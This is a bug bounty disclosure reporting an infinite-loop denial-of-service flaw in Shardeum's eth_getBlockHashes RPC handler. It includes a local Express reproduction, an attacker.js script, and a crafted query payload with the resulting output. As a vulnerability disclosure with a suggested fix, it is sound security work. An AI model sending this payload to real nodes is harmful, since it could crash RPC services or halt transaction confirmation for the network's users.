# 33872 - \[BC - Critical] Infinite loop in shardeum

## Infinite loop in shardeum

Submitted on Jul 31st 2024 at 21:32:23 UTC by @riproprip for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33872

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardeum/tree/dev>

Impacts:

* RPC API crash affecting projects with greater than or equal to 25% of the market capitalization on top of the respective layer
* Network not being able to confirm new transactions (total network shutdown)

### Description

### Brief/Intro

Infinite loop in shardeum handler for eth\_getBlockHashes route.

### Vulnerability Details

The eth\_getBlockHashes handler does not correctly constrain the fromBlock / toBlock query parameters. This bug allows to put the process into an infinite for loop. That crashes the process that is answering this request.

The relevant function is in <https://github.com/shardeum/shardeum/blob/c7b10c2370028f7c7cbd2a01839e50eb50faa904/src/index.ts#L1275-L1295>.

I would have loved to suss out the impact a little more, but can't find instructions that make the repos run (on my machine). Following assumptions probably lead the way in deciding if this is just an rpc crash or can take down every node in the network simply by sending a request:

* handlers behind the externalApiMiddleware are exposed to the outside
* The attacker is allowed to send one request for every OS process running the eth\_getBlockHashes handler
* The OS processes running shardeum/src/index.ts L1275-1295 is also responsible/relevant to the network confirming new transaction.

If above assumption don't all hold up or are not enough to qualify for the "prevent network from confirming transactions" impact, please keep in mind the following about infinite loops.:

* They don't produce an error (hard to monitor for)
* The process does not die (hard to recover from)
* The process uses up as much of the CPU as the OS will allow

This in effect could take down other processes running on the server, depending on the configuration of the node, and the hardware.

### Impact Details

The process handling a malicious request gets stuck in an infinite loop.

### Fix suggestion

Make sure the distance between fromBlock and toBlock in the eth\_getBlockHashes handler something meaningful.

### Proof of concept

## code

### Minimal code to reproduce shardeum/src/index.ts (save as server.js)

```
const express = require('express');
const app = express();
const port = 3000;

// external data to GET handler
let ShardeumFlags = {maxNumberOfOldBlocks: 99};
let latestBlock = 999;
let readableBlocks= [];

// original typescript code
/* 
  shardus.registerExternalGet('eth_getBlockHashes', externalApiMiddleware, async (req, res) => {
    let fromBlock: any = req.query.fromBlock
    let toBlock: any = req.query.toBlock

    if (fromBlock == null) return res.json({ error: 'Missing fromBlock' })
    if (typeof fromBlock === 'string') fromBlock = parseInt(fromBlock)
    if (fromBlock < latestBlock - ShardeumFlags.maxNumberOfOldBlocks) {
      // return max 100 blocks
      fromBlock = latestBlock - ShardeumFlags.maxNumberOfOldBlocks + 1 // 1 is added for safety
    }
    if (toBlock == null) toBlock = latestBlock
    if (typeof toBlock === 'string') fromBlock = parseInt(toBlock)
    if (toBlock > latestBlock) toBlock = latestBlock

    const blockHashes = []
    for (let i = fromBlock; i <= toBlock; i++) { !!!!!! LOOP RUNS FOREVER WITH RIGHT INPUTFOREVER
      const block = readableBlocks[i]
      if (block) blockHashes.push(block.hash)
    }
    return res.json({ blockHashes, fromBlock, toBlock })
  })
*/

// translated GET handler as minimal expressjs
let fn = async (req, res) => {
  let fromBlock/*: any*/ = req.query.fromBlock
  let toBlock/*: any*/ = req.query.toBlock

  if (fromBlock == null) return res.json({ error: 'Missing fromBlock' })
  if (typeof fromBlock === 'string') fromBlock = parseInt(fromBlock)
  if (fromBlock < latestBlock - ShardeumFlags.maxNumberOfOldBlocks) {
    // return max 100 blocks
    fromBlock = latestBlock - ShardeumFlags.maxNumberOfOldBlocks + 1 // 1 is added for safety
  }
  if (toBlock == null) toBlock = latestBlock
  if (typeof toBlock === 'string') fromBlock = parseInt(toBlock)
  if (toBlock > latestBlock) toBlock = latestBlock

  const blockHashes = []
  for (let i = fromBlock; i <= toBlock; i++) { /// !!!!!! LOOP RUNS FOREVER WITH RIGHT INPUT
  	console.log('ITERATION', i); // !!!!! see?
    const block = readableBlocks[i]
    if (block) blockHashes.push(block.hash)
  }
  return res.json({ blockHashes, fromBlock, toBlock })
};

// express code
app.get('/', fn)
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
```

### attack code (save as attacker.js)

```

const axios   = require("axios");
const fs      = require("fs");
const payload = "fromBlock=null&toBlock=-99999999999999999";

function attack() {
	axios.get("http://localhost:3000/?" + payload, {timeout: 1000})
     .then(
	     res => {
		     console.log('Status ', res.status);
		     console.log(res.data);
		     process.exit();
	     },
	     err => {console.log('ERR', err.message);}
     )
}

attack();
```

## run

### server

```
npm install express
node server.js
```

### attacker

```
npm install axios
node attacker.js
```

## output

### server

```
Server running at http://localhost:3000
ITERATION -100000000000000000
ITERATION -100000000000000000
ITERATION -100000000000000000
ITERATION -100000000000000000
ITERATION -100000000000000000
ITERATION -100000000000000000
ITERATION -100000000000000000
ITERATION -100000000000000000
ITERATION -100000000000000000
.... # this keeps on going forever
```

### client

```
ERR timeout of 1000ms exceeded
```
